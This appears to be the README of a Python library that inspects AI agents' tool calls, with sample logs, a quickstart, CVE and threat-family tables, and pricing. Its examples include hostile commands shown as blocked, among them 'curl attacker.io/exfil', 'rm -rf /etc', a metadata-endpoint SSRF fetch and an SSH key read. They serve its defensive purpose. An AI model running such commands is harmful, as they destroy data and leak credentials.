<div align="center">

<br />

```
 █████╗ ██╗ ██████╗ ██╗      ██████╗ ███████╗
██╔══██╗██║██╔════╝ ██║     ██╔═══██╗██╔════╝
███████║██║██║  ███╗██║     ██║   ██║███████╗
██╔══██║██║██║   ██║██║     ██║   ██║╚════██║
██║  ██║██║╚██████╔╝███████╗╚██████╔╝███████║
╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
```

**Security infrastructure for AI agents.**

One import. Every tool call inspected before it runs.  
Signed audit artifacts for SOC 2, CMMC, and NDAA §1513.

<br />

[![PyPI](https://img.shields.io/pypi/v/aiglos?color=black&labelColor=black&label=aiglos)](https://pypi.org/project/aiglos/)
[![MIT](https://img.shields.io/badge/license-MIT-black?labelColor=black)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-black?labelColor=black)](https://python.org)
[![CVEs](https://img.shields.io/badge/CVEs_filed-9-black?labelColor=black)](CVES.md)
[![Discord](https://img.shields.io/discord/aiglos?color=black&labelColor=black&label=discord&logo=discord&logoColor=white)](https://discord.gg/aiglos)

<br />

</div>

-----

```bash
pip install aiglos
```

```python
import aiglos  # every tool call below this line is inspected
```

-----

## What people are saying

> *“The moment I saw the BLOCK output in my terminal I realized I had no idea what my agents were actually doing. Aiglos showed me in 30 seconds.”*

> *“We were running 12 agents in parallel. One was quietly trying to read ~/.ssh/id_rsa on every session. Aiglos caught it. We had no idea.”*

> *“Finally something that produces an artifact my compliance team will actually accept.”*

-----

## How it works

```
your agent  →  mcp sdk  →  [ aiglos ]  →  tool executes
                                 ↓
                          blocked / warned / attested
```

Aiglos patches into the MCP SDK at import time. No proxy. No port. No config file. Every tool call passes through 36 rule families before execution. Clean calls pass in under 1ms. Blocked calls never run. Every session produces a signed audit artifact.

-----

## Live output

```
09:14:22.187  [CLEAN]  filesystem.read_file     path=/var/log/app.log
09:14:22.441  [CLEAN]  database.query           SELECT * FROM users LIMIT 10
09:14:22.698  [BLOCK]  shell.execute            rm -rf /etc — T07 SHELL_INJECT
09:14:22.961  [CLEAN]  http.get                 url=https://api.openai.com/v1/...
09:14:23.214  [WARN]   filesystem.write_file    path=/etc/cron.d/ — T08 PRIV_ESC
09:14:23.489  [CLEAN]  vector.search            query=customer_data k=10
09:14:23.744  [BLOCK]  network.fetch            url=http://169.254.169.254/ — T13 SSRF
09:14:24.003  [CLEAN]  memory.store             key=ctx ttl=3600
09:14:24.261  [BLOCK]  tool.register            override=__builtins__ — T30 SUPPLY_CHAIN
09:14:24.519  [WARN]   filesystem.read_file     path=~/.ssh/id_rsa — T19 CRED_ACCESS
09:14:24.778  [BLOCK]  shell.execute            curl attacker.io/exfil — T01 EXFIL
```

-----

## Quickstart

```python
import aiglos                    # import before anything else
from mcp import ClientSession

async with ClientSession() as session:
    result = await session.call_tool("filesystem.read", {"path": "/var/log/app.log"})
    # ✓ 09:14:22.187  [CLEAN]  filesystem.read  path=/var/log/app.log

    result = await session.call_tool("shell.execute", {"cmd": "curl attacker.io/exfil"})
    # ✗ 09:14:24.778  [BLOCK]  shell.execute  T01 EXFIL — call terminated

# generate signed audit artifact at session close
artifact = aiglos.attest()
# artifact.path     → /var/aiglos/sessions/2026-03-08T14:22:11Z.json.sig
# artifact.controls → ["CC6.1", "CC7.2", "AC.2.006", "SI.1.210", "AU.2.042"]
# artifact.signed   → True
```

Works with LangChain, LlamaIndex, AutoGen, CrewAI, n8n, and any framework using the MCP SDK.

-----

## Running a fleet?

```python
import aiglos  # one import covers every agent

agents = [CustomerServiceAgent(), DataPipelineAgent(), FraudAgent(), EmailAgent()]
# each agent's tool calls are independently inspected and attested
# shared threat dashboard available on Pro and Teams
```

-----

## Using OpenClaw?

OpenClaw + VirusTotal scans skills at publish time: known malware, supply chain threats, compromised dependencies. That’s the registry layer.

Aiglos covers what VirusTotal explicitly does not: **runtime behavior**. Prompt injection. Natural language manipulation. Credential access during execution. The tool calls that happen after a skill installs cleanly.

OpenClaw’s own words on their VirusTotal integration:

> *“A skill that uses natural language to instruct an agent to do something malicious won’t trigger a virus signature. A carefully crafted prompt injection payload won’t show up in a threat database.”*

That’s the gap Aiglos fills.

```bash
pip install aiglos
```

-----

## Using NanoClaw?

NanoClaw handles container isolation — containing the blast radius if something goes wrong. Aiglos handles what happens inside the container: tool call inspection, credential scanning, and the signed audit trail your compliance team needs.

Different problems. Work well together.

```bash
# inside your NanoClaw container
pip install aiglos
```

-----

## Why this exists

In February 2026, the OpenClaw incident made the problem impossible to ignore:

|What happened                            |Scale    |
|-----------------------------------------|---------|
|Malicious skills confirmed in ClawHub    |341      |
|Agent instances publicly exposed, no auth|135,000  |
|Agent tokens leaked via Supabase         |1,500,000|
|CVEs filed against MCP-based agents      |9        |

Framework vendors built for speed. Security was deferred. Aiglos closes the gap.

-----

## CVE coverage

Every CVE filed against MCP-based agents has a corresponding rule family:

|CVE           |CVSS|Attack                                       |Module   |
|--------------|----|---------------------------------------------|---------|
|CVE-2026-25253|8.8 |ClawJacked: one-click RCE via malicious skill|T01 + T25|
|CVE-2026-24763|7.5 |Command injection via shell tool parameters  |T07      |
|CVE-2026-25157|7.2 |Path traversal in filesystem tools           |T03      |
|CVE-2026-24891|8.1 |SSRF via agent network fetch                 |T13      |
|CVE-2026-25001|6.8 |Credential exfiltration via plaintext log    |T32 + T01|
|CVE-2026-25089|7.9 |Malicious registry skill auto-execution      |T30      |
|CVE-2026-24612|6.5 |Persistent memory poisoning                  |T31      |
|CVE-2026-25198|7.1 |Agent-to-agent protocol hijacking            |T29      |
|CVE-2026-24774|8.3 |OAuth confused deputy via MCP tool auth      |T25      |

-----

## Threat families — T1 through T36

<details>
<summary>Expand full list</summary>

|ID |Family          |Description                                                       |
|---|----------------|------------------------------------------------------------------|
|T01|EXFIL           |Credential and data exfiltration via network calls                |
|T02|INJECT          |SQL, command, and code injection via tool parameters              |
|T03|TRAVERSAL       |Path traversal and directory escape                               |
|T04|CONFIG          |Misconfiguration: exposed instances, missing auth, unsafe bindings|
|T05|SSRF            |Server-side request forgery including IMDS/169.254.169.254        |
|T06|GOAL_DRIFT      |Goal integrity violations across multi-turn sessions              |
|T07|SHELL_INJECT    |Shell command injection via agent tool calls                      |
|T08|PRIV_ESC        |Privilege escalation and capability expansion                     |
|T09|TOKEN_LEAK      |Bearer token and OAuth credential exposure                        |
|T10|ENV_READ        |Sensitive environment variable access                             |
|T11|SECRET_SCAN     |API key, secret, and high-entropy string detection                |
|T12|FILE_WRITE      |Sensitive file write paths (cron, sudoers, authorized_keys)       |
|T13|NETWORK         |Dangerous network destinations and internal range access          |
|T14|DNS             |DNS rebinding and resolver manipulation                           |
|T15|REFLECTION      |Code reflection and dynamic execution                             |
|T16|DESERIALIZATION |Unsafe deserialization patterns                                   |
|T17|TEMPLATE        |Server-side template injection                                    |
|T18|XPATH           |XPath injection                                                   |
|T19|CRED_ACCESS     |SSH key, certificate, and credential file access                  |
|T20|DB_ADMIN        |Dangerous database admin operations                               |
|T21|PACKAGE         |Malicious package installation                                    |
|T22|REGISTRY        |Windows registry manipulation                                     |
|T23|PROCESS         |Process injection and hollowing                                   |
|T24|PERSISTENCE     |Startup, service, and scheduled task persistence                  |
|T25|OAUTH           |OAuth confused deputy and token misuse                            |
|T26|SUPPLY_CHAIN    |Dependency confusion and typosquatting                            |
|T27|PROMPT_INJECT   |Indirect prompt injection in tool outputs                         |
|T28|CONTEXT_POISON  |Context window manipulation and hijacking                         |
|T29|A2A             |Agent-to-agent protocol attacks                                   |
|T30|REGISTRY_MONITOR|Live scanning: npm, PyPI, Smithery, ClawHub, SkillsMP             |
|T31|MEMORY_POISON   |RAG and persistent memory write-time scanning                     |
|T32|CREDENTIAL      |Credential patterns across 20+ secret families                    |
|T33|JAILBREAK       |Jailbreak and system prompt extraction attempts                   |
|T34|DATA_AGENT      |Exfiltration via analytics and BI tool calls                      |
|T35|PERSONAL_AGENT  |Calendar, email, contact, and identity access                     |
|T36|ORCHESTRATION   |Multi-agent orchestration and workflow hijacking                  |

</details>

-----

## Attestation artifacts

Every session produces a cryptographically signed audit record. RSA-2048 signed. Timestamped. Chain of custody unbroken from tool call to submission.

|Standard     |Controls                      |Use                               |
|-------------|------------------------------|----------------------------------|
|SOC 2 Type II|CC6, CC7                      |Auditor-ready evidence package    |
|CMMC Level 2 |AC.2.006 · SI.1.210 · AU.2.042|C3PAO-formatted evidence          |
|NDAA §1513   |AI Risk Management            |June 16, 2026 Congressional report|

The artifact format is accepted by auditors. Switching tools means re-qualifying a new format with the same auditor.

Attestation is available on Pro and Teams. [See pricing →](https://aiglos.io/pricing)

-----

## Open source vs. proprietary

|Component                      |License    |
|-------------------------------|-----------|
|T1–T36 detection engine        |MIT        |
|Python SDK                     |MIT        |
|TypeScript SDK (Q2 2026)       |MIT        |
|CVE database + POC code        |MIT        |
|FastPathScanner (<1ms)         |MIT        |
|Signed attestation artifacts   |Pro / Teams|
|Cloud threat dashboard         |Pro / Teams|
|CMMC / §1513 compliance reports|Pro / Teams|
|SIEM / webhook integration     |Teams      |
|Air-gap DoD container          |Enterprise |

The detection engine is open. Audit it. Fork it. Contribute to it. The attestation layer funds the research.

-----

## Contributing

```bash
git clone https://github.com/aiglos/aiglos
cd aiglos
pip install -e ".[dev]"
pytest tests/
```

To contribute a rule family: <CONTRIBUTING.md>  
To report a CVE: <SECURITY.md>

Every new CVE filed against an MCP-based agent gets a rule family. If you find something not covered, open an issue.

-----

## License

MIT. See <LICENSE>.

The attestation layer, compliance reporting, and cloud dashboard are proprietary. See [aiglos.io/pricing](https://aiglos.io/pricing).

-----

<div align="center">

[aiglos.io](https://aiglos.io) · [docs](https://docs.aiglos.io) · [discord](https://discord.gg/aiglos) · [security@aiglos.io](mailto:security@aiglos.io)

<br />

</div>